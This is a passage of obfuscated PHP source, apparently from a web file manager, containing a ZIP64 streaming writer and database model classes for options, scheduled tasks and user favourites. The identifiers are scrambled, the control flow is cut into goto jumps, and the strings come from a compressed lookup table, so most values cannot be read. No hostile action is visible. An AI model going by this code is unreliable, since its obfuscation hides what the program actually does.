$C¥£™„·ç‚ = $this->filterFilename($C¥£™„·ç‚); $B††‡×Ë†¥ = static::METHOD_STORE; $AÂ¤ĞŞ¸± = $this->addFileHeader($C¥£™„·ç‚, $B††‡×Ë†¥); goto Cİô‡í‡÷œ; Fî„ƒğ„·: $Bİ‹öÁº±Ï = hash_init($_SERVER[İë¬“ÅÒÛ›][1451]); while (!feof($CÒè£®è¸)) { $EñŠ¬¤‰ = fread($CÒè£®è¸, 1048576); hash_update($Bİ‹öÁº±Ï, $EñŠ¬¤‰); $this->send($EñŠ¬¤‰); } $E‹ÙšøšõÀ = hexdec(hash_final($Bİ‹öÁº±Ï)); goto d¦ÆÖ×¿Ù…; Cİô‡í‡÷œ: fseek($CÒè£®è¸, 0, SEEK_END); $bŠÙªá„¼ = $b©•ïæ„Éİ = ftell($CÒè£®è¸); rewind($CÒè£®è¸); goto Fî„ƒğ„·; d¦ÆÖ×¿Ù…: $this->addFileFooter($C¥£™„·ç‚, $B††‡×Ë†¥, $E‹ÙšøšõÀ, $bŠÙªá„¼, $b©•ïæ„Éİ, $AÂ¤ĞŞ¸±); goto FÍ¡˜İê×; FÍ¡˜İê×: } public function finish() { foreach ($this->files as $c›ÄÌÆØì‹) { $this->addCdrFile($c›ÄÌÆØì‹); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($e®Œ•¿¥ç¢, $c ‰¡”»°Û) { goto B­†÷¶éÄ; AÃÖÙéäé: $eÉ»Ù•ì‡² = $this->packFields($FŞßƒî); $d¶øŒ²¨ºÆ = $this->packFields($Fî”İîÂ‘İ); $this->send($eÉ»Ù•ì‡² . $e®Œ•¿¥ç¢ . $d¶øŒ²¨ºÆ); goto bàäõ‚Ø‹; E²ÕÛÄ±×: $E†‹Şİ‹Š™ = $this->dosTime(time()); $FŞßƒî = array(array($AİÙÑÆÂ¿[1453], static::FILE_HEADER_SIGNATURE), array($AİÙÑÆÂ¿[1454], static::ZIP_VERSION_64), array($AİÙÑÆÂ¿[1454], 8), array($AİÙÑÆÂ¿[1454], $c ‰¡”»°Û), array($AİÙÑÆÂ¿[1453], $E†‹Şİ‹Š™), array($AİÙÑÆÂ¿[1453], 0), array($AİÙÑÆÂ¿[1453], 4294967295), array($AİÙÑÆÂ¿[1453], 4294967295), array($AİÙÑÆÂ¿[1454], $DêÒ»ÀÌ”), array($AİÙÑÆÂ¿[1454], 32)); $Fî”İîÂ‘İ = array(array($AİÙÑÆÂ¿[1454], 1), array($AİÙÑÆÂ¿[1454], 28), array($AİÙÑÆÂ¿[1455], 0), array($AİÙÑÆÂ¿[1455], 0), array($AİÙÑÆÂ¿[1455], 0), array($AİÙÑÆÂ¿[1453], 0)); goto AÃÖÙéäé; B­†÷¶éÄ: $AİÙÑÆÂ¿ =& $_SERVER[İë¬“ÅÒÛ›]; $e®Œ•¿¥ç¢ = preg_replace($AİÙÑÆÂ¿[1452], $AİÙÑÆÂ¿[33], $e®Œ•¿¥ç¢); $DêÒ»ÀÌ” = strlen($e®Œ•¿¥ç¢); goto E²ÕÛÄ±×; bàäõ‚Ø‹: return strlen($eÉ»Ù•ì‡²) + $DêÒ»ÀÌ” + strlen($d¶øŒ²¨ºÆ); goto Aó•ÕÙª‹É; Aó•ÕÙª‹É: } protected function addFileFooter($fï…Á—ğ, $BÛ‚Êğ¦ºó, $B¡äÊ¡¥Æ, $eõ¶š×Ô, $d²–òš•èÜ, $D˜Ÿø–¬—) { $EÈŒœì´ñ× =& $_SERVER[İë¬“ÅÒÛ›]; $C”“©‘«æÊ = array(array($EÈŒœì´ñ×[1453], static::DATA_DESCRIPTOR_SIGNATURE), array($EÈŒœì´ñ×[1453], $B¡äÊ¡¥Æ), array($EÈŒœì´ñ×[1455], $eõ¶š×Ô), array($EÈŒœì´ñ×[1455], $d²–òš•èÜ)); $dº¹º¿ø§É = $this->packFields($C”“©‘«æÊ); $this->send($dº¹º¿ø§É); $b¾¯‡¬„ÉÃ = $D˜Ÿø–¬— + $eõ¶š×Ô + $fâÙì¡ğ‘¯; $this->addToCdr($fï…Á—ğ, $BÛ‚Êğ¦ºó, $B¡äÊ¡¥Æ, $eõ¶š×Ô, $d²–òš•èÜ, $b¾¯‡¬„ÉÃ); } private function addToCdr($D“†Ğ‘’Èâ, $Fˆ¢«½ö›, $Cƒ®ØÔ·Ù¤, $fÙ¸ŠÂ—ù, $bâÀŞ¾˜§Ú, $Dù‚ˆŠ¦ñÁ) { $this->files[] = array($D“†Ğ‘’Èâ, $Fˆ¢«½ö›, $Cƒ®ØÔ·Ù¤, $fÙ¸ŠÂ—ù, $bâÀŞ¾˜§Ú, $this->ofs); $this->ofs += $Dù‚ˆŠ¦ñÁ; } protected function addCdrFile($F³Õ¸Ãğù) { goto AÖñë¹ğÂ›; C÷ñÆ»Ù‚: $this->send($CŠÕ·™øÀŠ); $this->cdr_ofs += strlen($CŠÕ·™øÀŠ); goto fãßİ‹Åà˜; f¸É·Êù‚Ÿ: $F©Û‚¥êñ = $this->dosTime(time()); $fÉäÜ†ÒÆ‘ = array(array($Eî«ÍŒˆŒñ[1453], static::CDR_FILE_SIGNATURE), array($Eî«ÍŒˆŒñ[1454], static::ZIP_VERSION_64), array($Eî«ÍŒˆŒñ[1454], static::ZIP_VERSION_64), array($Eî«ÍŒˆŒñ[1454], 8), array($Eî«ÍŒˆŒñ[1454], $Eƒñ„Ùà˜„), array($Eî«ÍŒˆŒñ[1453], $F©Û‚¥êñ), array($Eî«ÍŒˆŒñ[1453], $F‡›ï¯£è×), array($Eî«ÍŒˆŒñ[1453], 4294967295), array($Eî«ÍŒˆŒñ[1453], 4294967295), array($Eî«ÍŒˆŒñ[1454], strlen($aàšÎ£ğœ)), array($Eî«ÍŒˆŒñ[1454], 32), array($Eî«ÍŒˆŒñ[1454], strlen($A¤à¤’†¢)), array($Eî«ÍŒˆŒñ[1454], 0), array($Eî«ÍŒˆŒñ[1454], 0), array($Eî«ÍŒˆŒñ[1453], 32), array($Eî«ÍŒˆŒñ[1453], 4294967295)); $D¦×±ÇŞ¨¢ = array(array($Eî«ÍŒˆŒñ[1454], 1), array($Eî«ÍŒˆŒñ[1454], 28), array($Eî«ÍŒˆŒñ[1455], $B©ïÍÕğµ), array($Eî«ÍŒˆŒñ[1455], $EÂ…Çºôƒ½), array($Eî«ÍŒˆŒñ[1455], $Dí“Ë…¤£), array($Eî«ÍŒˆŒñ[1453], 0)); goto A¯ó³‚© †; A¯ó³‚© †: $añ‡Å¢±Â = $this->packFields($fÉäÜ†ÒÆ‘); $E‰¾é½¯Ò¦ = $this->packFields($D¦×±ÇŞ¨¢); $CŠÕ·™øÀŠ = $añ‡Å¢±Â . $aàšÎ£ğœ . $A¤à¤’†¢ . $E‰¾é½¯Ò¦; goto C÷ñÆ»Ù‚; AÖñë¹ğÂ›: $Eî«ÍŒˆŒñ =& $_SERVER[İë¬“ÅÒÛ›]; list($aàšÎ£ğœ, $Eƒñ„Ùà˜„, $F‡›ï¯£è×, $EÂ…Çºôƒ½, $B©ïÍÕğµ, $Dí“Ë…¤£) = $F³Õ¸Ãğù; $A¤à¤’†¢ = $Eî«ÍŒˆŒñ[33]; goto f¸É·Êù‚Ÿ; fãßİ‹Åà˜: } protected function addCdr64Eof() { goto Aó˜‰æˆ¡; Aó˜‰æˆ¡: $f¯ôîßĞ´â =& $_SERVER[İë¬“ÅÒÛ›]; $eÔàôŞãÏ› = count($this->files); $FÁÌäÂÙ«÷ = $this->cdr_ofs; goto Eİ¾Ë³ÍÜ²; DÏ÷”¥òÈ: $this->send($AÃ£Í¼ÒâØ); goto FÓ©¸ÔÁ; Eİ¾Ë³ÍÜ²: $f‡ô‘‹œ£ = $this->ofs; $C×ËåÀÄÛ = array(array($f¯ôîßĞ´â[1453], static::ZIP64_CDR_EOF_SIGNATURE), array($f¯ôîßĞ´â[1455], 44), array($f¯ôîßĞ´â[1454], static::ZIP_VERSION_64), array($f¯ôîßĞ´â[1454], static::ZIP_VERSION_64), array($f¯ôîßĞ´â[1453], 0), array($f¯ôîßĞ´â[1453], 0), array($f¯ôîßĞ´â[1455], $eÔàôŞãÏ›), array($f¯ôîßĞ´â[1455], $eÔàôŞãÏ›), array($f¯ôîßĞ´â[1455], $FÁÌäÂÙ«÷), array($f¯ôîßĞ´â[1455], $f‡ô‘‹œ£)); $AÃ£Í¼ÒâØ = $this->packFields($C×ËåÀÄÛ); goto DÏ÷”¥òÈ; FÓ©¸ÔÁ: } protected function addCdr64Locator() { goto aÃˆÙ£‘Ú; aÏÓñ®ÄÚù: $cÔ„»ÇÒÀ‘ = $this->ofs; $céöÔºæ¹ = array(array($CÀªã‘ÈÓæ[1453], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($CÀªã‘ÈÓæ[1453], 0), array($CÀªã‘ÈÓæ[1455], $cÔ„»ÇÒÀ‘ + $F–Î™–Ÿƒ•), array($CÀªã‘ÈÓæ[1453], 1)); $A¢Û’ğ÷Í = $this->packFields($céöÔºæ¹); goto dİ»Ù¤½˜; aÃˆÙ£‘Ú: $CÀªã‘ÈÓæ =& $_SERVER[İë¬“ÅÒÛ›]; $DÂ¶áå†é = count($this->files); $F–Î™–Ÿƒ• = $this->cdr_ofs; goto aÏÓñ®ÄÚù; dİ»Ù¤½˜: $this->send($A¢Û’ğ÷Í); goto B¼…ö‘‡; B¼…ö‘‡: } protected function addCdrEof() { goto AÆôÄ»¬Ç»; b‚–ëšˆ‡: $Eïè—ˆ„ºŞ = $this->ofs; $Aê—ˆçÕŞ– = $e³åìğŒ´[33]; $eÌÅĞáªØ¯ = array(array($e³åìğŒ´[1453], static::CDR_EOF_SIGNATURE), array($e³åìğŒ´[1454], 0), array($e³åìğŒ´[1454], 0), array($e³åìğŒ´[1454], $cÁê«ó†Ë), array($e³åìğŒ´[1454], $cÁê«ó†Ë), array($e³åìğŒ´[1453], 4294967295), array($e³åìğŒ´[1453], 4294967295), array($e³åìğŒ´[1454], strlen($Aê—ˆçÕŞ–))); goto aˆ¨‚˜•É; aˆ¨‚˜•É: $DÄŒ’Ä‰Õ– = $this->packFields($eÌÅĞáªØ¯) . $Aê—ˆçÕŞ–; $this->send($DÄŒ’Ä‰Õ–); goto E¹ñ“‹ñ; AÆôÄ»¬Ç»: $e³åìğŒ´ =& $_SERVER[İë¬“ÅÒÛ›]; $cÁê«ó†Ë = count($this->files); $eå›º©š½˜ = $this->cdr_ofs; goto b‚–ëšˆ‡; E¹ñ“‹ñ: } protected function addCdr() { foreach ($this->files as $BíğŠ»ôš) { $this->addCdrFile($BíğŠ»ôš); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $EÍî‰å¹İˆ =& $_SERVER[İë¬“ÅÒÛ›]; $A®ŠÌ‹ è = $EÍî‰å¹İˆ[202]; if ($this->outputName) { $cŒÃŞ¬‰ = trim(str_replace(array($EÍî‰å¹İˆ[112], $EÍî‰å¹İˆ[55], $EÍî‰å¹İˆ[94], $EÍî‰å¹İˆ[68], $EÍî‰å¹İˆ[224], $EÍî‰å¹İˆ[487]), $EÍî‰å¹İˆ[33], $this->outputName)); $a¡Ğ¡³ †‚ = rawurlencode($cŒÃŞ¬‰); $A®ŠÌ‹ è .= "\x3b\40\x66\151\154\x65\156\141\155\145\x2a\x3d\x75\164\x66\55\x38\47\x27{$a¡Ğ¡³ †‚}"; } $e±›´­Ù‹á = array($EÍî‰å¹İˆ[199] => $EÍî‰å¹İˆ[1456], $EÍî‰å¹İˆ[1457] => $A®ŠÌ‹ è, $EÍî‰å¹İˆ[1458] => $EÍî‰å¹İˆ[1459], $EÍî‰å¹İˆ[1460] => $EÍî‰å¹İˆ[1461], $EÍî‰å¹İˆ[1462] => $EÍî‰å¹İˆ[1463]); foreach ($e±›´­Ù‹á as $b«ïÂ¬Ş©Î => $E¶‡´ÜÎß) { header($b«ïÂ¬Ş©Î . $EÍî‰å¹İˆ[650] . $E¶‡´ÜÎß); } } protected function send($C‘Ÿø–šÖ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $C‘Ÿø–šÖ); } protected final function dosTime($F­¼İÓŸõ·) { $a¨¾±Ëëì› =& $_SERVER[İë¬“ÅÒÛ›]; $AÁƒöÚŠ— = getdate($F­¼İÓŸõ·); if ($AÁƒöÚŠ—[$a¨¾±Ëëì›[1464]] < 1980) { $AÁƒöÚŠ— = array($a¨¾±Ëëì›[1464] => 1980, $a¨¾±Ëëì›[1465] => 1, $a¨¾±Ëëì›[1466] => 1, $a¨¾±Ëëì›[1467] => 0, $a¨¾±Ëëì›[1468] => 0, $a¨¾±Ëëì›[1469] => 0); } $AÁƒöÚŠ—[$a¨¾±Ëëì›[1464]] -= 1980; return $AÁƒöÚŠ—[$a¨¾±Ëëì›[1464]] << 25 | $AÁƒöÚŠ—[$a¨¾±Ëëì›[1465]] << 21 | $AÁƒöÚŠ—[$a¨¾±Ëëì›[1466]] << 16 | $AÁƒöÚŠ—[$a¨¾±Ëëì›[1467]] << 11 | $AÁƒöÚŠ—[$a¨¾±Ëëì›[1468]] << 5 | $AÁƒöÚŠ—[$a¨¾±Ëëì›[1469]] >> 1; } protected function packFields($a²ô©…ëÀ‘) { $eÙÍ‰ËĞš =& $_SERVER[İë¬“ÅÒÛ›]; $dÁ˜Ó˜áò‘ = $eÙÍ‰ËĞš[33]; $f±¥«öô = array(); foreach ($a²ô©…ëÀ‘ as $døÈ¼Æ‡£°) { $dÁ˜Ó˜áò‘ .= $døÈ¼Æ‡£°[0]; $f±¥«öô[] = $døÈ¼Æ‡£°[1]; } array_unshift($f±¥«öô, $dÁ˜Ó˜áò‘); return call_user_func_array($eÙÍ‰ËĞš[1470], $f±¥«öô); } protected function filterFilename($BŞ…æçÚ) { $dš®·†…çö =& $_SERVER[İë¬“ÅÒÛ›]; return str_replace(array($dš®·†…çö[94], $dš®·†…çö[4], $dš®·†…çö[173], $dš®·†…çö[70], $dš®·†…çö[112], $dš®·†…çö[695], $dš®·†…çö[698], $dš®·†…çö[275]), $dš®·†…çö[71], $BŞ…æçÚ); } } class ZipStream { } goto E¿Ïãğ×Ÿô; A²¿à¡‹çç: define($_SERVER[İë¬“ÅÒÛ›][233], 1); define($_SERVER[İë¬“ÅÒÛ›][234], 0); define($_SERVER[İë¬“ÅÒÛ›][235], 2); goto FÑÎ‡Ôğò; dµ‡›»îİÒ: function ActionCall($C¦î×çñÑÈ) { $FÈÂõ•ßóÊ = array_slice(func_get_args(), 1); return ActionApply($C¦î×çñÑÈ, $FÈÂõ•ßóÊ); } function ActionCallHook($fÀâÒ¦’Õ•) { goto c¯ºÒ÷ï°½; f®˜™ğ›ñ: $e»Îä…ƒ»ï = $eóĞ•”˜â ? json_decode($eóĞ•”˜â, !0) : $e»Îä…ƒ»ï; $GLOBALS[$eö‰²ÛÈÄ[18]] = 0; return $e»Îä…ƒ»ï; goto fÖÄ»Ğ¢; fõˆº›ñ„Û: $GLOBALS[$eö‰²ÛÈÄ[18]] = 1; $e»Îä…ƒ»ï = ActionApply($fÀâÒ¦’Õ•, $AÊÀ‘µŸ›œ); $eóĞ•”˜â = ob_get_clean(); goto f®˜™ğ›ñ; c¯ºÒ÷ï°½: $eö‰²ÛÈÄ =& $_SERVER[…Ã²ÛÚÈÔ]; ob_start(); $AÊÀ‘µŸ›œ = array_slice(func_get_args(), 1); goto fõˆº›ñ„Û; fÖÄ»Ğ¢: } function beforeShutdown() { Hook::trigger($_SERVER[…Ã²ÛÚÈÔ][19]); } goto A¨Åò£‡ğÛ; bæÄÙàÜœÜ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($d²Ş«´„–Ù = false, $c ãìá½‰ = '', $AßšÚâ“î§ = false) { goto BäÈŠô”öÏ; B­õÏÙÑ‹: $Ešç¥øİ¬¯ = $this->filterWhere(array($a‚ª½åšå[29] => $c ãìá½‰)); $fóäğÎ¹ = $this->where($Ešç¥øİ¬¯)->select(); $fóäğÎ¹ = array_to_keyvalue($fóäğÎ¹, $a‚ª½åšå[88], $a‚ª½åšå[360]); goto d÷Öæ¼Œê­; d÷Öæ¼Œê­: foreach ($fóäğÎ¹ as $aŠ™Æ½›£ => $bÃØÁÏÍÍ°) { if ($AßšÚâ“î§ || in_array($aŠ™Æ½›£, $this->jsonField)) { $fóäğÎ¹[$aŠ™Æ½›£] = json_decode($fóäğÎ¹[$aŠ™Æ½›£], !0); } } $this->cacheSet($c ãìá½‰, $fóäğÎ¹); return $d²Ş«´„–Ù ? $fóäğÎ¹[$d²Ş«´„–Ù] : $fóäğÎ¹; goto cò‚²Å ßŒ; BäÈŠô”öÏ: $a‚ª½åšå =& $_SERVER[İë¬“ÅÒÛ›]; $fóäğÎ¹ = $this->cacheGet($c ãìá½‰); if (is_array($fóäğÎ¹)) { return $d²Ş«´„–Ù ? isset($fóäğÎ¹[$d²Ş«´„–Ù]) ? $fóäğÎ¹[$d²Ş«´„–Ù] : null : $fóäğÎ¹; } goto B­õÏÙÑ‹; cò‚²Å ßŒ: } public function set($BÀõØ†¼îƒ, $Aµ¥‡µè—« = false, $aäÔ¼Ïƒ® = '') { $c½ø‚¤‹Ğ =& $_SERVER[İë¬“ÅÒÛ›]; $this->cacheRemove($aäÔ¼Ïƒ®); $e±´¦ÊÄ = array(); $AÓ£Ÿ‘¤¾× = is_array($BÀõØ†¼îƒ) ? $BÀõØ†¼îƒ : array($BÀõØ†¼îƒ => $Aµ¥‡µè—«); foreach ($AÓ£Ÿ‘¤¾× as $BÀõØ†¼îƒ => $FòÙ”Â¶Ï) { if (is_array($FòÙ”Â¶Ï)) { $FòÙ”Â¶Ï = json_encode_force($FòÙ”Â¶Ï); } $FòÙ”Â¶Ï = self::textEncode($FòÙ”Â¶Ï); $AÓ£Ÿ‘¤¾× = array($c½ø‚¤‹Ğ[29] => $aäÔ¼Ïƒ®, $c½ø‚¤‹Ğ[88] => $BÀõØ†¼îƒ, $c½ø‚¤‹Ğ[360] => $FòÙ”Â¶Ï); $e±´¦ÊÄ[] = $this->filterWhere($AÓ£Ÿ‘¤¾×); } return $this->addAll($e±´¦ÊÄ, array(), !0); } public function setDeep($FÛ‚¡Õ¢Ûì, $b¥¯…ôìã = false, $B†ØöÚ¸ôÌ = '') { $c¢É»›™¼Ğ = explode($_SERVER[İë¬“ÅÒÛ›][92], $FÛ‚¡Õ¢Ûì); $B•ñÈ¬ê‰‹ = $this->get(); array_set_value($B•ñÈ¬ê‰‹, $FÛ‚¡Õ¢Ûì, $b¥¯…ôìã); $this->set($c¢É»›™¼Ğ[0], $B•ñÈ¬ê‰‹[$c¢É»›™¼Ğ[0]], $B†ØöÚ¸ôÌ); } public function remove($F“–¹›àîÀ, $eöÒ“•é = '') { $EœŒµË‹Í =& $_SERVER[İë¬“ÅÒÛ›]; $this->CacheRemove($eöÒ“•é); $B¡ïÓ¢¹Ûì = $this->filterWhere(array($EœŒµË‹Í[88] => $F“–¹›àîÀ, $EœŒµË‹Í[29] => $eöÒ“•é)); if (is_null($F“–¹›àîÀ)) { unset($B¡ïÓ¢¹Ûì[$EœŒµË‹Í[88]]); } return $this->where($B¡ïÓ¢¹Ûì)->delete(); } public function cacheSet($EÓˆÄ¸Ü•, $E‡¦†àîªç = false) { return Cache::set($this->cacheKey($EÓˆÄ¸Ü•), $E‡¦†àîªç); } public function cacheGet($d¡‹ùã½˜) { return Cache::get($this->cacheKey($d¡‹ùã½˜)); } public function cacheRemove($CŠ‚•Ä¬ˆË) { return Cache::remove($this->cacheKey($CŠ‚•Ä¬ˆË)); } protected function filterWhere($bÂ²ôµ›Å„) { return $bÂ²ôµ›Å„; } protected function cacheKey($b—Â£…„æÎ) { return $b—Â£…„æÎ; } } define($_SERVER[İë¬“ÅÒÛ›][370], $_SERVER[İë¬“ÅÒÛ›][371]); $_SERVER[»] = explode($_SERVER[İë¬“ÅÒÛ›][372], gzinflate(substr($_SERVER[İë¬“ÅÒÛ›][373], 10, -8))); goto Bƒ‰ÄÍç¥ä; AÅ£²İ¬èÕ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\164\x61\163\x6b\x4c\151\163\x74"; public $field = array("\x6e\141\155\145", "\164\x79\160\145", "\145\166\x65\x6e\164", "\164\151\155\145", "\x64\145\x73\143", "\163\x79\x73\x74\145\155", "\145\156\141\142\154\145", "\x6c\141\x73\164\122\165\156", "\x73\157\x72\164"); public function listData($EÎğó“ˆâÀ = false, $føÖçœÊ¶“ = "\x73\x6f\x72\164", $F«™Ù÷¤Öè = false) { return parent::listData($EÎğó“ˆâÀ, $føÖçœÊ¶“, $F«™Ù÷¤Öè); } public function add($a•‰µ¾ÍÑ§) { $cÂ®½¶·øÀ =& $_SERVER[İë¬“ÅÒÛ›]; $Få‚ŞÑƒÁ = $this->findByName($a•‰µ¾ÍÑ§[$cÂ®½¶·øÀ[28]]); if ($Få‚ŞÑƒÁ) { return !1; } $a•‰µ¾ÍÑ§[$cÂ®½¶·øÀ[1061]] = 0; $a•‰µ¾ÍÑ§[$cÂ®½¶·øÀ[1567]] = $this->getSort(); return parent::insert($a•‰µ¾ÍÑ§); } private function getSort() { $e²ºíÖõ…“ =& $_SERVER[İë¬“ÅÒÛ›]; $e‘ ğƒŒ¤¼ = parent::listData(); $dáàéºÖ·Ç = array_to_keyvalue($e‘ ğƒŒ¤¼, $e²ºíÖõ…“[33], $e²ºíÖõ…“[1567]); return empty($dáàéºÖ·Ç) ? 0 : max($dáàéºÖ·Ç) + 1; } public function update($Cİ „®“, $f•³¾„İ‘Ì) { $fã´©ÑôŠ„ =& $_SERVER[İë¬“ÅÒÛ›]; $C”˜ÖÒ“Øï = $this->listData($Cİ „®“); $e™©¡ßÙĞ† = $this->findByName($f•³¾„İ‘Ì[$fã´©ÑôŠ„[28]]); if (!$C”˜ÖÒ“Øï || $e™©¡ßÙĞ† && $e™©¡ßÙĞ†[$fã´©ÑôŠ„[369]] != $C”˜ÖÒ“Øï[$fã´©ÑôŠ„[369]]) { return !1; } return parent::update($Cİ „®“, $f•³¾„İ‘Ì); } public function remove($AĞ‚î‚® ˆ) { $d”ÁµŠÃó = $this->listData($AĞ‚î‚® ˆ); if (!$d”ÁµŠÃó || $d”ÁµŠÃó[$_SERVER[İë¬“ÅÒÛ›][827]]) { return !1; } return parent::remove($AĞ‚î‚® ˆ); } public function enable($c¤Ó•ŞªÖ¸) { $CÙ¿÷µ±¬· =& $_SERVER[İë¬“ÅÒÛ›]; $CÎğÁÚõÇ = $this->listData($c¤Ó•ŞªÖ¸); $Bù¶Èã°° = !$CÎğÁÚõÇ[$CÙ¿÷µ±¬·[1068]]; return $this->update($c¤Ó•ŞªÖ¸, array($CÙ¿÷µ±¬·[1906] => $Bù¶Èã°°)); } public function run($c«Ö¢–»ò) { return $this->update($c«Ö¢–»ò, array($_SERVER[İë¬“ÅÒÛ›][1907] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($EœÖ¡Ã£Ì¶) { $eÉğ¦—¼¾„ =& $_SERVER[İë¬“ÅÒÛ›]; return array($eÉğ¦—¼¾„[1908] => array(USER_ID, $eÉğ¦—¼¾„[1909])); } protected function listData() { $Dì÷â£¼¾ =& $_SERVER[İë¬“ÅÒÛ›]; $dÉİì¤¦Ş = array($Dì÷â£¼¾[1086] => USER_ID, $Dì÷â£¼¾[1910] => 0); $fÃè¾ä¯­‡ = $Dì÷â£¼¾[1911]; $d·­·ßˆ™ = $this->field($fÃè¾ä¯­‡)->where($dÉİì¤¦Ş)->order($Dì÷â£¼¾[1912])->select(); return $d·­·ßˆ™ ? $d·­·ßˆ™ : array(); } protected function resetCache() { } protected function listView() { goto e÷ÃË–‰÷Ş; e÷ÃË–‰÷Ş: $D¹ğ´¿Ó·‘ =& $_SERVER[İë¬“ÅÒÛ›]; $c­Êš¾„Á¥ = $this->listData(); $c™Ÿ¯…Â½ƒ = array_filter_by_field($c­Êš¾„Á¥, $D¹ğ´¿Ó·‘[29], $D¹ğ´¿Ó·‘[986]); goto dÕ¿àõºÎ; dÕ¿àõºÎ: $D÷¯ÉŠîàë = array_to_keyvalue($c™Ÿ¯…Â½ƒ, $D¹ğ´¿Ó·‘[33], $D¹ğ´¿Ó·‘[76]); if (!$D÷¯ÉŠîàë) { return $c­Êš¾„Á¥; } $A‰‡ÜªŸ¥ = 2000; goto a½»æô‡©Œ; a½»æô‡©Œ: $Fºíù¶œ’ = array($D¹ğ´¿Ó·‘[416] => array($D¹ğ´¿Ó·‘[983], $D÷¯ÉŠîàë)); $b»¯›Ö· = Model($D¹ğ´¿Ó·‘[522])->listSource($Fºíù¶œ’, $A‰‡ÜªŸ¥); $b»¯›Ö· = array_merge($b»¯›Ö·[$D¹ğ´¿Ó·‘[74]], $b»¯›Ö·[$D¹ğ´¿Ó·‘[75]]); goto aÁ¾½©¥”ù; aÁ¾½©¥”ù: $b»¯›Ö· = array_to_keyvalue($b»¯›Ö·, $D¹ğ´¿Ó·‘[375]); foreach ($c­Êš¾„Á¥ as $e¾¹õ¹÷‚á => $AöïÀ³¥Ğ®) { $Dº“¤ƒÖè = $b»¯›Ö·[$AöïÀ³¥Ğ®[$D¹ğ´¿Ó·‘[76]]]; $Dº“¤ƒÖè = $Dº“¤ƒÖè ? $Dº“¤ƒÖè : array(); $c­Êš¾„Á¥[$e¾¹õ¹÷‚á] = array_merge($Dº“¤ƒÖè, $AöïÀ³¥Ğ®); } return $c­Êš¾„Á¥; goto cÑË¤µ¡; cÑË¤µ¡: } protected function addFav($d÷¡ŒŒ¿÷Á, $bè®£›¹ = '', $CÉ¯¤®ßŸä = "\163\157\x75\x72\x63\x65") { goto dÕÕ¾²·; aİÂƒŠ¥²: $c½±ÖÑøä‰ = array($Eî¿¢÷á‚‰[1086] => USER_ID, $Eî¿¢÷á‚‰[1910] => 0); $e©ƒºÍİó± = $this->where($c½±ÖÑøä‰)->max($Eî¿¢÷á‚‰[1567]); if (!$e©ƒºÍİó±) { $e©ƒºÍİó± = 0; } goto f²‹Ğìƒ‘£; f²‹Ğìƒ‘£: if (!$bè®£›¹ && $CÉ¯¤®ßŸä == $Eî¿¢÷á‚‰[986]) { $eˆ°±ŠôÙ´ = Model($Eî¿¢÷á‚‰[855])->where(array($Eî¿¢÷á‚‰[416] => $d÷¡ŒŒ¿÷Á))->find(); if (!$eˆ°±ŠôÙ´) { return !1; } $bè®£›¹ = $eˆ°±ŠôÙ´[$Eî¿¢÷á‚‰[28]]; } $bè®£›¹ = $this->getAutoName($bè®£›¹); $Dâõö¦Ùà = array($Eî¿¢÷á‚‰[1086] => USER_ID, $Eî¿¢÷á‚‰[1910] => 0, $Eî¿¢÷á‚‰[388] => $bè®£›¹, $Eî¿¢÷á‚‰[1608] => $d÷¡ŒŒ¿÷Á, $Eî¿¢÷á‚‰[815] => $CÉ¯¤®ßŸä, $Eî¿¢÷á‚‰[1550] => $e©ƒºÍİó± + 1); goto bĞ°‰œºÖÈ; bĞ°‰œºÖÈ: return $this->add($Dâõö¦Ùà); goto C¼„†ªª; dÕÕ¾²·: $Eî¿¢÷á‚‰ =& $_SERVER[İë¬“ÅÒÛ›]; $c½±ÖÑøä‰ = array($Eî¿¢÷á‚‰[1086] => USER_ID, $Eî¿¢÷á‚‰[1910] => 0, $Eî¿¢÷á‚‰[815] => $CÉ¯¤®ßŸä, $Eî¿¢÷á‚‰[1608] => $d÷¡ŒŒ¿÷Á); if ($this->where($c½±ÖÑøä‰)->find()) { return !1; } goto aİÂƒŠ¥²; C¼„†ªª: } protected function remove($dïÛèİôô) { $Dª£ßŞÎ±™ =& $_SERVER[İë¬“ÅÒÛ›]; $CèëÂŞ†© = array($Dª£ßŞÎ±™[1086] => USER_ID, $Dª£ßŞÎ±™[817] => $dïÛèİôô); return $this->where($CèëÂŞ†©)->delete(); } protected function removeByName($A“´á‘¨ŠÜ) { $cµ•½ïº =& $_SERVER[İë¬“ÅÒÛ›]; $dª«èÉÃ½™ = array($cµ•½ïº[1086] => USER_ID, $cµ•½ïº[388] => $A“´á‘¨ŠÜ, $cµ•½ïº[1910] => 0); return $this->where($dª«èÉÃ½™)->delete(); } protected function rename($C„¿ªÎ‹êô, $fÅ“¸ŒÚƒ) { $fŸËø‰¸¯Ş =& $_SERVER[İë¬“ÅÒÛ›]; if ($C„¿ªÎ‹êô == $fÅ“¸ŒÚƒ) { return !1; } $cä¹©«ÕäË = $this->getAutoName($fÅ“¸ŒÚƒ); if ($fÅ“¸ŒÚƒ != $cä¹©«ÕäË) { return !1; } $E·óÒã´ë = array($fŸËø‰¸¯Ş[1086] => USER_ID, $fŸËø‰¸¯Ş[1910] => 0, $fŸËø‰¸¯Ş[28] => $C„¿ªÎ‹êô); return $this->where($E·óÒã´ë)->save(array($fŸËø‰¸¯Ş[28] => $fÅ“¸ŒÚƒ)); } protected function resetSort($dƒàµ²¥¾ç) { $bá‚Ë´Ş‚ =& $_SERVER[İë¬“ÅÒÛ›]; $cæ§¿Ğí‰Ú = array($bá‚Ë´Ş‚[1086] => USER_ID); for ($dĞï³ËÌØ = 0; $dĞï³ËÌØ < count($dƒàµ²¥¾ç); $dĞï³ËÌØ++) { $cæ§¿Ğí‰Ú[$bá‚Ë´Ş‚[817]] = $dƒàµ²¥¾ç[$dĞï³ËÌØ]; $this->where($cæ§¿Ğí‰Ú)->save(array($bá‚Ë´Ş‚[1550] => $dĞï³ËÌØ + 1)); } return !0; } protected function moveTop($Aˆ¬È¿í•Ä) { goto E‚‰‹ŒÂ¥; 